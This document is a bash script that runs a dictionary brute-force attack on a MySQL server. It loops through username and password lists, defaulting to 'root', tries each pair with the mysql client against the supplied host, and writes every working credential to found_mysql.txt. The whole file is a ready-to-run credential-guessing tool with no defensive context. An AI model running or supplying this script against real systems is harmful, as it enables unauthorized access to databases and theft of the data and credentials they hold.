#!/bin/bash


HOSTNAME="$1"
TIMEOUT="$2"
dicpass="./txt/mysql-pass.dic"
dicuser="./txt/mysql-user.dic"

if [[ ! -f "$dicuser" ]]; then
	echo "root" > "$dicuser"
fi

if [[ ! -f "$dicpass" ]]; then
	echo "root" > "$dicpass"
fi

cat "$dicuser" | while read user
do
	user=$(echo "$user" |tr -d "\n")
	user=$(echo "$user" |xargs)
    if [ -z "$user" ]; then
	   continue
    fi
	
	cat "$dicpass" | while read passwd
	do
	   passwd=$(echo "$passwd" |tr -d "\n")
	   passwd=$(echo "$passwd" |xargs)
	   if [ -z "$passwd" ]; then
		   continue
	   fi
	   echo "try: mysql://${user}:${passwd}@${HOSTNAME}"
	   mysqlbf=$(mysql --connect-timeout=${TIMEOUT} -h"${HOSTNAME}" -u"${user}" -p"${passwd}" -e "show databases")
	   #echo "$mysqlbf"
	   if [[ $mysqlbf = *"Database"* ]]; then
		   echo "[found] mysql://${user}:${passwd}@${HOSTNAME}"
		   echo "${user}:${passwd}@${HOSTNAME}" >> "found_mysql.txt"
	   fi
	   sleep 1
	   #~ ERROR 1045 (28000): Access denied for user
	   if [[ "$mysqlbf" = *"Access denied for user"* ]]; then
			continue
		else
			echo "[info] no mysqlserver: $HOSTNAME" |grep --color ".*"
			break 3
	   fi
	   
	done
done

